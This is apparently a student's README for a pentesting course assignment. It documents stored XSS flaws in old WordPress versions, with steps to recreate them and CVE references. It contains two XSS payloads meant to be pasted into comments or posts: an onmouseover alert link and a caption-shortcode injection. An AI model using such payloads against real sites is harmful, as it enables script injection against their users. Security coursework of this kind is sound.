# codepathwk7
# Project 7 - WordPress Pentesting

Time spent: **X** hours spent in total

> Objective: Find, analyze, recreate, and document **five vulnerabilities** affecting an old version of WordPress

## Pentesting Report
1. (Required) Vulnerability Name or ID
  - [ ] Summary: 
    - Vulnerability types:
    - Tested in version:
    - Fixed in version: 
  - [ ] GIF Walkthrough: 
  - [ ] Steps to recreate: 
  - [ ] Affected source code:
    - [Link 1](https://core.trac.wordpress.org/browser/tags/version/src/source_file.php)
2. XSS Exploitation
  - [ ] Summary: Authenticated Shortcode Tags XSS
    - Vulnerability types: XSS
    - Tested in version: 4.2
    - Fixed in version: 4.7.2
  - [ ] GIF Walkthrough: <img src='https://raw.githubusercontent.com/lihaojin/codepathwk7/master/Exploit 2 XSS.gif'/>
  - [ ] Steps to recreate: 
- Paste the following in the comment section and post it as admin.

```
<a href = "XSS" onmouseover=alert(1) rel="nofollow">CLICK ME!</a>
```

- Then hover over the link in the comment.
  - [ ] Affected source code:
    - [Link to Source](https://github.com/WordPress/WordPress/commit/f72b21af23da6b6d54208e5c1d65ececdaa109c8)
    
3. Authenticated Stored Cross-Site Scripting (XSS)
  - [ ] Summary: 
  When the hacker has access to a account that has the ability to make a post, they can insert javascript to the post
    - Vulnerability types: XSS
- Tested in version: 4.2.2
- Fixed in version: 4.2.3
  - [ ] GIF Walkthrough: 
  - [ ] Steps to recreate: 
  - First log in to an account where you can make posts.
  - Create or edit a post and paste the following code into the html editor.
  ```
  <a href="[caption code=">]</a><a title=" <Event-attribute-with-JS-code-here>  ">link</a>
  ```
  - [ ] Affected source code:
    - [CVE-2015-5622](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5622)
    - [CVE-2015-5623](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5623)


## Assets

List any additional assets, such as scripts or files

## Resources

- [WordPress Source Browser](https://core.trac.wordpress.org/browser/)
- [WordPress Developer Reference](https://developer.wordpress.org/reference/)

GIFs created with [LiceCap](http://www.cockos.com/licecap/).

## Notes

Describe any challenges encountered while doing the work

## License

    Copyright [yyyy] [name of copyright owner]

    Licensed under the Apache License, Version 2.0 (the "License");
    you may not use this file except in compliance with the License.
    You may obtain a copy of the License at

        http://www.apache.org/licenses/LICENSE-2.0

    Unless required by applicable law or agreed to in writing, software
    distributed under the License is distributed on an "AS IS" BASIS,
    WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
    See the License for the specific language governing permissions and
    limitations under the License.
